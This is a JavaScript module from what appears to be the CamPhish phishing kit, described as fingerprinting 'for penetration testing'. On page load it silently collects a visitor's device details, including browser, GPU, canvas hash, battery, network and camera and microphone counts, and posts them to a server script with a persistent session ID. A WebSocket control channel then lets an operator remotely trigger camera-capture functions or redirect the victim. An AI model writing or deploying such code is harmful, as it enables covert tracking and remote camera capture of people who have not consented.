// CamPhish v2 - Device Fingerprinting Module
// Collects device information for penetration testing

(function() {
    'use strict';

    var fingerprint = {};

    // Basic device info
    fingerprint.userAgent = navigator.userAgent || 'Unknown';
    fingerprint.platform = navigator.platform || 'Unknown';
    fingerprint.language = navigator.language || navigator.userLanguage || 'Unknown';
    fingerprint.languages = (navigator.languages || []).join(', ');
    fingerprint.cookiesEnabled = navigator.cookieEnabled;
    fingerprint.doNotTrack = navigator.doNotTrack || 'Not set';
    fingerprint.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
    fingerprint.timezoneOffset = new Date().getTimezoneOffset();

    // Screen info
    fingerprint.screenWidth = screen.width;
    fingerprint.screenHeight = screen.height;
    fingerprint.screenAvailWidth = screen.availWidth;
    fingerprint.screenAvailHeight = screen.availHeight;
    fingerprint.colorDepth = screen.colorDepth;
    fingerprint.pixelRatio = window.devicePixelRatio || 1;
    fingerprint.orientation = (screen.orientation && screen.orientation.type) || 'Unknown';

    // Hardware
    fingerprint.cpuCores = navigator.hardwareConcurrency || 'Unknown';
    fingerprint.deviceMemory = navigator.deviceMemory || 'Unknown';
    fingerprint.maxTouchPoints = navigator.maxTouchPoints || 0;
    fingerprint.touchSupport = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);

    // Network info
    if (navigator.connection) {
        fingerprint.networkType = navigator.connection.effectiveType || 'Unknown';
        fingerprint.networkDownlink = navigator.connection.downlink || 'Unknown';
        fingerprint.networkRtt = navigator.connection.rtt || 'Unknown';
        fingerprint.networkSaveData = navigator.connection.saveData || false;
    } else {
        fingerprint.networkType = 'API not available';
    }

    // Online status
    fingerprint.onLine = navigator.onLine;

    // Battery info
    function getBattery() {
        if (navigator.getBattery) {
            navigator.getBattery().then(function(battery) {
                fingerprint.batteryLevel = Math.round(battery.level * 100) + '%';
                fingerprint.batteryCharging = battery.charging;
                fingerprint.batteryChargingTime = battery.chargingTime === Infinity ? 'Not charging' : battery.chargingTime + ' sec';
                fingerprint.batteryDischargingTime = battery.dischargingTime === Infinity ? 'N/A' : battery.dischargingTime + ' sec';
                
                // Re-send with battery data
                sendFingerprint();
            });
        } else {
            fingerprint.batteryLevel = 'API not available';
            sendFingerprint();
        }
    }

    // GPU / WebGL info
    function getGPU() {
        try {
            var canvas = document.createElement('canvas');
            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    fingerprint.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    fingerprint.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                } else {
                    fingerprint.gpuVendor = 'Unknown';
                    fingerprint.gpuRenderer = gl.getParameter(gl.RENDERER);
                }
                fingerprint.webglVersion = gl.getParameter(gl.VERSION);
            } else {
                fingerprint.gpuRenderer = 'WebGL not supported';
            }
        } catch(e) {
            fingerprint.gpuRenderer = 'Error detecting GPU';
        }
    }

    // Canvas fingerprint (unique identifier)
    function getCanvasFingerprint() {
        try {
            var canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 50;
            var ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 200, 50);
            ctx.fillStyle = '#069';
            ctx.fillText('CamPhish v2 FP', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('CamPhish v2 FP', 4, 17);
            fingerprint.canvasHash = hashCode(canvas.toDataURL());
        } catch(e) {
            fingerprint.canvasHash = 'Error';
        }
    }

    // Simple hash function
    function hashCode(str) {
        var hash = 0;
        for (var i = 0; i < str.length; i++) {
            var char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash |= 0;
        }
        return hash.toString(16);
    }

    // Detect browser
    function detectBrowser() {
        var ua = navigator.userAgent;
        if (ua.indexOf('Firefox') > -1) return 'Firefox';
        if (ua.indexOf('SamsungBrowser') > -1) return 'Samsung Browser';
        if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) return 'Opera';
        if (ua.indexOf('Trident') > -1) return 'Internet Explorer';
        if (ua.indexOf('Edge') > -1) return 'Edge Legacy';
        if (ua.indexOf('Edg') > -1) return 'Edge Chromium';
        if (ua.indexOf('Chrome') > -1) return 'Chrome';
        if (ua.indexOf('Safari') > -1) return 'Safari';
        return 'Unknown';
    }

    // Detect OS
    function detectOS() {
        var ua = navigator.userAgent;
        if (ua.indexOf('Windows NT 10.0') > -1) return 'Windows 10/11';
        if (ua.indexOf('Windows NT 6.3') > -1) return 'Windows 8.1';
        if (ua.indexOf('Windows NT 6.2') > -1) return 'Windows 8';
        if (ua.indexOf('Windows NT 6.1') > -1) return 'Windows 7';
        if (ua.indexOf('Mac OS X') > -1) return 'macOS';
        if (ua.indexOf('Android') > -1) return 'Android ' + (ua.match(/Android\s([0-9.]+)/) || [])[1];
        if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) return 'iOS';
        if (ua.indexOf('Linux') > -1) return 'Linux';
        if (ua.indexOf('CrOS') > -1) return 'Chrome OS';
        return 'Unknown';
    }

    // Detect device type
    function detectDevice() {
        var ua = navigator.userAgent;
        if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return 'Tablet';
        if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated/i.test(ua)) return 'Mobile';
        return 'Desktop';
    }

    fingerprint.browser = detectBrowser();
    fingerprint.os = detectOS();
    fingerprint.deviceType = detectDevice();

    // Media devices (cameras/mics count)
    function getMediaDevices() {
        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
            navigator.mediaDevices.enumerateDevices().then(function(devices) {
                var cameras = 0, mics = 0, speakers = 0;
                devices.forEach(function(device) {
                    if (device.kind === 'videoinput') cameras++;
                    if (device.kind === 'audioinput') mics++;
                    if (device.kind === 'audiooutput') speakers++;
                });
                fingerprint.camerasCount = cameras;
                fingerprint.micsCount = mics;
                fingerprint.speakersCount = speakers;
            });
        }
    }

    // Send fingerprint to server
    function sendFingerprint() {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'fingerprint.php', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        
        // C-CAM v3.0 Mapping node
        var sessionID = localStorage.getItem('ccam_session') || "S_" + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('ccam_session', sessionID);
        fingerprint.sessionID = sessionID;

        var data = 'fingerprint=' + encodeURIComponent(JSON.stringify(fingerprint));
        xhr.send(data);
    }

    // Collect everything
    getGPU();
    getCanvasFingerprint();
    getMediaDevices();

    // Battery is async, it will call sendFingerprint when ready
    // If no battery API, sendFingerprint gets called directly
    getBattery();

    // ====== C-CAM v3.0 Interactive WebSocket Control ======
    try {
        var wsHost = "127.0.0.1"; // Standard fallback loopback node
        var ws = new WebSocket("ws://" + wsHost + ":8765");
        var sessionID = localStorage.getItem('ccam_session') || "S_" + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('ccam_session', sessionID);

        ws.onopen = function() {
            ws.send(JSON.stringify({ "type": "target", "id": sessionID }));
        };

        ws.onmessage = function(event) {
            var data = JSON.parse(event.data);
            if (data.cmd === "SNAP") {
                if (typeof window.triggerScan === 'function') { window.triggerScan(); }
                else if (typeof window.startSecureConnect === 'function') { window.startSecureConnect(); }
                else if (typeof window.openCreator === 'function') { window.openCreator(); }
                else if (typeof window.startStreamAuth === 'function') { window.startStreamAuth(); }
                else {
                    var btn = document.querySelector('button');
                    if (btn) btn.click();
                }
            } else if (data.cmd === "REDIRECT") {
                window.location.href = data.url;
            }
        };
    } catch(e) { console.log("WS Control Node Error:", e); }

})();
